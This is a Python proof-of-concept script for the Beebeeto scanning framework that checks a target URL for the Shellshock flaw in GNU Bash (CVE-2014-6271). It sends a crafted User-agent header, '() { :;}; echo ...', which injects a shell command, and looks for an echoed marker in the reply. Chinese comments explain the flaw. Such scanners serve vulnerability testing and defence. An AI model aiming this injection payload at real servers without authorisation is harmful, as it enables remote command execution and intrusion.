#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import md5
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0032',
            'name': 'GNU Bash <= 4.3 Shockshell 破壳漏洞 POC',
            'author': 'Tommy',
            'create_date': '2015-02-12',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'bash',
            'vul_version': ['<=4.3'],
            'type': 'Command Execution',
            'tag': ['bash漏洞', 'CVE-2014-6271', 'ShellShock破壳漏洞', 'cgi'],
            'desc': '执行shell命令，从而导致信息泄漏、未授权的恶意修改、服务中断',
            'references': [
                'http://www.exploit-db.com/exploits/34765/',
                'http://blog.knownsec.com/2014/09/shellshock_response_profile/',
            ],
        },
    }


    '''
    GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，
    向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，
    以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。
    此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。
    这些变量可以包含代码，在Shell被调用后会被立即执行。
    '''

    @classmethod
    def verify(cls, args):
	ip =  args['options']['target']
	opener = urllib2.build_opener()
	# Modify User-agent header value for Shell Shock test
	opener.addheaders = [
                ('User-agent', '() { :;}; echo Content-Type: text/plain ; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
				('Accept','text/plain'),
				('Content-type','application/x-www-form-urlencoded'),
				('Referer','http://www.baidu.com')
				]
	try:
		URL = ip
		response = opener.open(URL)
		headers = response.info()
		status = response.getcode()
		opener.close()
		if status==200:
			if "1a8b8e54b53f63a8efae84e064373f19" in headers:
				args['success'] = True
				args['poc_ret']['vul_url'] = URL
			else:
				args['success'] = False
		return args
		
	except Exception as e:
		opener.close()
		args['success'] = False
		return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())